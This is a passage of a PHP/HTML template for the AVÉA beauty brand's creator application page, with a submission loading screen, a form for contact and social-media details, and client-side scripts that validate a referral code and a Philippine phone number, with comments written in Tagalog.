    .mini-card img,.form-submit,.progress-item .dot{transition:none;}
  }
</style>
</head>

<body>

<?php if ($showLoading): ?>

<!-- ============================ LOADING ============================ -->
<div class="loading">
  <span class="blob b1"></span>
  <span class="blob b2"></span>

  <div class="loading-card">
    <div class="loading-inner">
      <div class="spinner"></div>
      <span class="kicker">Please Wait</span>
      <h2>Submitting Your <em>Application</em></h2>
      <p class="loading-text">
        We're sending your details to our creator relations team. This will only take a moment.
      </p>

      <div class="bar"><i></i></div>

      <div class="ref-panel">
        <p class="ref-label">Your Reference Number</p>
        <div class="ref-loading"><?php echo htmlspecialchars($referenceNumber); ?></div>
        <p>Please keep this for your records.</p>

        <p class="ref-label" style="margin-top:20px;">Your Referral Code</p>
        <div class="ref-loading" style="font-size:1.45rem;"><?php echo htmlspecialchars($referralCode); ?></div>
        <p>Share this with other creators — once they apply and get verified, your referral benefits grow.</p>

        <p class="highlight" style="margin-top:12px;">
          Our team will reach out by email if your profile is a fit for an active campaign.
        </p>
      </div>
    </div>
  </div>
</div>

<script>
/* I-save ang sariling referral code ng applicant sa localStorage
   PAGKATAPOS ng successful submission, para pag-balik niya sa
   index.php at binuksan ang "Refer & Earn" modal, makikita na
   niya agad ang sarili niyang shareable link. Tingnan ang
   renderOwnReferralStatus() sa index.php para sa consuming side. */
try {
  localStorage.setItem('aveaOwnReferralCode', <?php echo json_encode($referralCode); ?>);
  localStorage.setItem('aveaOwnReferralName', <?php echo json_encode($full_name); ?>);
} catch (e) {}

setTimeout(function () {
  window.location.href = "<?php echo htmlspecialchars($redirectUrl); ?>";
}, 3000);
</script>

<?php else: ?>

<div class="top-bar">Creator applications now open &nbsp;·&nbsp; No cost to apply</div>

<header>
  <nav class="nav">
    <a class="logo" href="index.php#top">AVÉA<span>.</span></a>
    <div class="nav-mid">Creator Application</div>
    <div class="nav-back"><a href="index.php#top">← Back to Site</a></div>
  </nav>
</header>

<main class="apply-page">

  <!-- ======================= LEFT VISUAL ======================= -->
  <aside class="apply-visual">
    <video autoplay muted loop playsinline class="apply-video">
      <source src="files/video/hero2.mp4" type="video/mp4">
    </video>

    <div class="visual-top">
      <a href="index.php#top" class="visual-logo">AVÉA<span>.</span></a>
    </div>

    <div class="visual-content">
      <span class="kicker">Creator Application</span>

      <h1>Become an <em>AVÉA</em> creator.</h1>

      <p class="visual-copy">
        Join a beauty brand that collaborates with its community — shade launches, product
        features, and campaign partnerships built together with real creators.
      </p>

      <div class="visual-tags">
        <span>No Cost To Apply</span>
        <span>All Platforms Welcome</span>
        <span>No Exclusivity Clause</span>
      </div>

      <div class="visual-block">
        <h4>What You Could Receive</h4>
        <ul class="visual-list">
          <li>AVÉA press kits and seasonal product drops</li>
          <li>Campaign briefs with clear creative direction</li>
          <li>Paid collaborations across TikTok, Instagram, YouTube, and Facebook</li>
        </ul>
      </div>

      <div class="visual-block">
        <h4>What We Look For</h4>
        <p>
          We review applications on content quality, audience engagement, and brand fit.
          There's no strict follower minimum — genuine, on-brand content matters most.
        </p>
      </div>

      <div class="visual-steps">
        <div class="visual-step">
          <span class="num">I</span>
          <p>Submit your profile and social media details.</p>
        </div>
        <div class="visual-step">
          <span class="num">II</span>
          <p>Our creator relations team reviews your application.</p>
        </div>
        <div class="visual-step">
          <span class="num">III</span>
          <p>We reach out by email within 1–3 days with next steps.</p>
        </div>
      </div>
    </div>

    <div class="visual-foot">AVÉA Beauty · Creator Relations</div>
  </aside>

  <!-- ======================= RIGHT FORM ======================= -->
  <section class="apply-content">
    <div class="form-shell">

      <div class="form-header reveal">
        <span class="kicker">Model &amp; Creator Application</span>
        <h1>Apply to <em>Collaborate</em></h1>
        <p class="lede">
          Fill out the form below to submit your application. Please provide active and correct
         information so our creator relations team can properly review your profile.
        </p>
      </div>

      <div class="progress-grid reveal">
        <div class="progress-item active"><span class="dot">I</span><p>Application</p></div>
        <div class="progress-item"><span class="dot">II</span><p>Review</p></div>
        <div class="progress-item"><span class="dot">III</span><p>Onboarding</p></div>
      </div>

      <div class="notice reveal">
        <span class="notice-icon">i</span>
        <div>
          <strong>Application Review:</strong> Applications are typically reviewed within 1–3 days.
          If selected, our team will contact you by email — we never ask for payment to apply or join.
        </div>
      </div>

      <?php if (!empty($errors)): ?>
      <div class="error-box">
        <strong>Please fix the following</strong>
        <ul>
          <?php foreach ($errors as $error): ?>
            <li><?php echo htmlspecialchars($error); ?></li>
          <?php endforeach; ?>
        </ul>
      </div>
      <?php endif; ?>

      <div class="mini-gallery reveal">
        <div class="mini-card"><img src="files/images/2.png" alt="AVÉA campaign imagery"></div>
        <div class="mini-card"><img src="files/images/1.png" alt="AVÉA product imagery"></div>
        <div class="mini-card"><img src="files/images/4.png" alt="AVÉA creator imagery"></div>
      </div>

      <div class="form-card reveal">
        <form method="POST" class="apply-form" id="applyForm" autocomplete="off">

          <p class="fieldset-head">Your Details</p>

          <div class="form-row">
            <div class="form-group full">
              <label for="referred_by">Referral Code <span class="hint" style="text-transform:none;letter-spacing:0;">(optional)</span></label>
              <div class="ref-field-row">
                <input
                  type="text" id="referred_by" name="referred_by"
                  value="<?php echo htmlspecialchars(strtoupper($incomingReferral)); ?>"
                  placeholder="e.g. AVEA-JANA920" maxlength="38" autocomplete="off"
                  pattern="AVEA-[A-Za-zÀ-ÖØ-öø-ÿ]{1,30}[0-9]{3}"
                  title="Format: AVEA-NAME123 (e.g. AVEA-JANA920)"
                >
                <button type="button" class="btn btn-outline" id="applyRefBtn">Apply Code</button>
              </div>
              <span class="hint" id="refAppliedHint" style="display:none;">✓ Referral code applied — this creator will get credit once you're verified.</span>
              <span class="hint" id="refErrorHint" style="display:none;color:#a3323f;">✕ Please correct the referral code. Format: <strong>AVEA-NAME123</strong> (e.g. AVEA-JANA920)</span>
              <span class="hint">Have a code from another AVÉA creator? Enter it here — totally optional.</span>
            </div>
          </div>

          <div class="form-row">
            <div class="form-group">
              <label for="full_name">Full Name <span class="req">*</span></label>
              <input type="text" id="full_name" name="full_name" placeholder="Enter full name" autocomplete="off" required>
            </div>
            <div class="form-group">
              <label for="email">Email Address <span class="req">*</span></label>
              <input type="email" id="email" name="email" placeholder="Enter email address" autocomplete="off" required>
            </div>
          </div>

          <div class="form-row">
            <div class="form-group">
              <label for="phoneInput">Phone Number <span class="req">*</span></label>
              <input
                type="text" name="phone" id="phoneInput" value="639"
                placeholder="639XXXXXXXXX" inputmode="numeric" maxlength="12" minlength="12"
                pattern="^639[0-9]{9}$" autocomplete="off" required
              >
              <span class="hint">Philippine mobile format — starts with 639.</span>
            </div>
            <div class="form-group">
              <label for="location">Location <span class="req">*</span></label>
              <input type="text" id="location" name="location" placeholder="City / Province" autocomplete="off" required>
            </div>
          </div>

          <div class="divider"></div>
          <p class="fieldset-head">Your Platform</p>

          <div class="form-row">
            <div class="form-group">
              <label for="platform">Main Platform <span class="req">*</span></label>
              <select name="platform" id="platform" autocomplete="off" required>
                <option value="" disabled selected>Select platform</option>
                <option>TikTok</option>
                <option>Instagram</option>
                <option>Facebook</option>
                <option>YouTube</option>
                <option>Multiple Platforms</option>
              </select>
            </div>
            <div class="form-group">
              <label for="followersInput">Number of Followers <span class="req">*</span></label>
              <input
                type="text" name="followers" id="followersInput" placeholder="Enter follower count"
                inputmode="numeric" maxlength="9" pattern="^[0-9]{1,9}$" autocomplete="off" required
              >
            </div>
          </div>

          <div class="form-row">
            <div class="form-group full">
              <label for="links">Social Media Links <span class="req">*</span></label>
              <textarea name="links" id="links" placeholder="Paste your TikTok, Instagram, or other profile links" autocomplete="off" required></textarea>
            </div>
          </div>

          <div class="divider"></div>
          <p class="fieldset-head">A Few More Things</p>

          <div class="form-row">
            <div class="form-group">
              <label for="source">How did you hear about us? <span class="req">*</span></label>
              <select name="source" id="source" autocomplete="off" required>
                <option value="" disabled selected>Select an option</option>
                <option>TikTok</option>
                <option>Instagram</option>
                <option>Facebook</option>
                <option>Friend / Referral</option>
                <option>Email</option>
                <option>Other</option>
              </select>
            </div>
            <div class="form-group">
              <label for="preference">Collaboration Preference <span class="req">*</span></label>
              <select name="preference" id="preference" autocomplete="off" required>
                <option value="" disabled selected>Select preference</option>
                <option>Product exchange</option>
                <option>Fixed rate</option>
                <option>Open to discussion</option>
                <option>Long-term collaboration</option>
              </select>
            </div>
          </div>

          <div class="form-row">
            <div class="form-group full">
              <label for="message">Additional Message</label>
              <textarea name="message" id="message" maxlength="600"
                placeholder="Optional: Tell us about your content style, audience, or why you want to work with AVÉA"
                autocomplete="off"></textarea>
              <span class="hint"><span id="msgCount">0</span> / 600 characters</span>
            </div>
          </div>

          <div class="check-group">
            <label class="check-item">
              <input type="checkbox" name="chk1" required>
              <span>I confirm that my social media links are correct and active.</span>
            </label>
            <label class="check-item">
              <input type="checkbox" name="chk2" required>
              <span>I understand that applications are subject to review and campaign availability.</span>
            </label>
            <label class="check-item">
              <input type="checkbox" name="chk3" required>
              <span>I agree to be contacted by AVÉA Beauty regarding this application.</span>
            </label>
          </div>

          <button type="submit" class="form-submit" id="submitBtn">
            Submit Application
            <svg class="arrow" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 12h15"/><path d="M13 6l6 6-6 6"/></svg>
          </button>

          <p class="form-note">
            There is no cost to apply. <strong>AVÉA will never ask you to pay a fee</strong> to be considered.
          </p>
        </form>
      </div>

    </div>
  </section>

</main>

<script>
/* ---------- Referral code field (optional) ----------
   1. Kapag may ?ref= sa URL, i-sync agad ang field kapag nag-load
      ang page — kahit palitan mo pa ang URL at i-reload, kukunin
      ulit nito ang bagong value (galing mismo sa current address
      bar, hindi cache).
   2. Habang nagta-type ang user, awtomatikong nagiging CAPS LOCK
      (uppercase) ang laman ng field — hindi na kailangan i-type
      ng creator sa malaking letra mismo.
   3. Ang "Apply Code" button ay hindi required — pindot lang ito
      para lumitaw ang maliit na confirmation text sa ibaba ng
      field. Kahit walang pindot dito, kasama pa rin ito pag
      pinasa ang form dahil nasa loob na ng <input> ang value.
------------------------------------------------------------- */
(function () {
  const refInput = document.getElementById('referred_by');
  const applyBtn = document.getElementById('applyRefBtn');
  const appliedHint = document.getElementById('refAppliedHint');
  const errorHint = document.getElementById('refErrorHint');
  if (!refInput) return;

  /* Kapareho ng server-side validator: AVEA- + letters + 3 digits */
  const REF_FORMAT = /^AVEA-[A-Za-zÀ-ÖØ-öø-ÿ]{1,30}[0-9]{3}$/;

  function validateRef(showError) {
    const value = refInput.value.trim().toUpperCase();
    if (value === '') {
      // optional field — walang error kapag blanko
      refInput.setCustomValidity('');
      if (errorHint) errorHint.style.display = 'none';
      if (appliedHint) appliedHint.style.display = 'none';
      return true;
    }
    const ok = REF_FORMAT.test(value);
    refInput.setCustomValidity(ok ? '' : 'Please correct the referral code. Format: AVEA-NAME123 (e.g. AVEA-JANA920).');
    if (errorHint) errorHint.style.display = (!ok && showError) ? 'block' : 'none';
    if (appliedHint && !ok) appliedHint.style.display = 'none';
    return ok;
  }

  // (1) i-sync sa kasalukuyang URL ?ref= kapag nag-load ang page
  const urlRef = new URLSearchParams(window.location.search).get('ref');
  if (urlRef) {
    refInput.value = urlRef.toUpperCase();
  }

  // (2) laging CAPS LOCK habang nagta-type
  refInput.addEventListener('input', function () {
    const pos = refInput.selectionStart;
    refInput.value = refInput.value.toUpperCase();
    refInput.setSelectionRange(pos, pos);
    /* Live validation habang nagta-type:
       - Mali ang format  -> lalabas AGAD ang "✕ Please correct..." hint
       - Tama ang format  -> lalabas agad ang "✓ Referral code applied" */
    const ok = validateRef(true);
    if (appliedHint) {
      appliedHint.style.display = (ok && refInput.value.trim() !== '') ? 'block' : 'none';
    }
  });

  // (3) "Apply Code" button — parehong check, pang-confirm lang
  if (applyBtn) {
    applyBtn.addEventListener('click', function () {
      refInput.value = refInput.value.trim().toUpperCase();
      const ok = validateRef(true);
      if (appliedHint) {
        appliedHint.style.display = (ok && refInput.value !== '') ? 'block' : 'none';
      }
      refInput.focus();
    });
  }

  // I-validate din agad ang value galing sa ?ref= URL kapag nag-load
  if (refInput.value.trim() !== '') {
    const ok = validateRef(true);
    if (appliedHint) appliedHint.style.display = ok ? 'block' : 'none';
  }
})();

/* ---------- Phone: locked 639 prefix ---------- */
const phoneInput = document.getElementById('phoneInput');
const followersInput = document.getElementById('followersInput');

phoneInput.addEventListener('input', function () {
  let value = phoneInput.value.replace(/\D/g, '');
  if (!value.startsWith('639')) {
    value = '639' + value.replace(/^639/, '').replace(/^0+/, '');
  }
  phoneInput.value = value.slice(0, 12);
});

phoneInput.addEventListener('keydown', function (e) {
  const cursorPosition = phoneInput.selectionStart;
  if ((e.key === 'Backspace' || e.key === 'Delete') && cursorPosition <= 3) {
    e.preventDefault();
  }
});

phoneInput.addEventListener('paste', function (e) {
  e.preventDefault();
  let pasted = (e.clipboardData || window.clipboardData).getData('text');
  pasted = pasted.replace(/\D/g, '');
  if (pasted.startsWith('09')) {
    pasted = '639' + pasted.slice(2);
  } else if (pasted.startsWith('9')) {
    pasted = '63' + pasted;
  } else if (!pasted.startsWith('639')) {
    pasted = '639';
  }
  phoneInput.value = pasted.slice(0, 12);
});

/* ---------- Followers: digits only ---------- */
followersInput.addEventListener('input', function () {
  followersInput.value = followersInput.value.replace(/\D/g, '').slice(0, 9);
});

/* ---------- Message counter ---------- */
const msg = document.getElementById('message');
const msgCount = document.getElementById('msgCount');
if (msg && msgCount){
  msg.addEventListener('input', function(){
    msgCount.textContent = msg.value.length;
  });
}

/* ---------- Submit state (prevents double-send) ---------- */
const applyForm = document.getElementById('applyForm');
const submitBtn = document.getElementById('submitBtn');
applyForm.addEventListener('submit', function(){
  if (applyForm.checkValidity()){
    submitBtn.disabled = true;
    submitBtn.firstChild.textContent = 'Submitting… ';
  }
});

/* ---------- Entrance ---------- */
document.addEventListener('DOMContentLoaded', function(){
  const items = document.querySelectorAll('.reveal');
  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches || !('IntersectionObserver' in window)){
    items.forEach(el => el.classList.add('in'));
    return;
  }
  const io = new IntersectionObserver(function(entries){
    entries.forEach(function(entry, i){
      if (!entry.isIntersecting) return;
      const el = entry.target;
      setTimeout(function(){ el.classList.add('in'); }, i * 90);
      io.unobserve(el);
    });
  }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });
  items.forEach(el => io.observe(el));
});
</script>

<?php endif; ?>

</body>
</html>
